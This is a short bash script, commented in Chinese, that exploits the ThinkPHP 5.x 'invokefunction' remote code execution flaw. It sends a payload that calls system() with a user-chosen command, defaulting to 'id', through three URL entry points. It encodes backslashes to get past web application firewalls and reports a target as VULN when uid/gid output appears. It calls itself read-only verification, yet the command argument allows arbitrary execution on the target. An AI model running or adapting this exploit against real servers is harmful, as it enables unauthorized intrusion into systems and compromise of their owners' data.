#!/usr/bin/env bash
# ThinkPHP 5.x invokefunction RCE —— 只读验证（id）
# 用法: bash tp5.sh http://10.0.0.5:8080 [cmd]
set -u
TARGET="${1:?usage: bash tp5.sh http://TARGET:PORT [cmd]}"
CMD="${2:-id}"
BASE="${TARGET%/}"

# %5C 是反斜杠；部分 WAF 认字面 \ 会拦，这里用编码形式
PAYLOAD="index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=${CMD}"
for entry in "$BASE/index.php?s=" "$BASE/?s=" "$BASE/index.php/"; do
  url="$entry$PAYLOAD"
  out=$(curl -sS -m 10 "$url" 2>/dev/null)
  code=$(curl -sS -m 10 -o /dev/null -w '%{http_code}' "$url" 2>/dev/null)
  if printf '%s' "$out" | grep -qE 'uid=[0-9]+|gid=[0-9]+'; then
    echo "VULN  $url"
    printf '%s\n' "$out" | head -5
    exit 0
  fi
  echo "SAFE  $code  $url"
done
exit 1
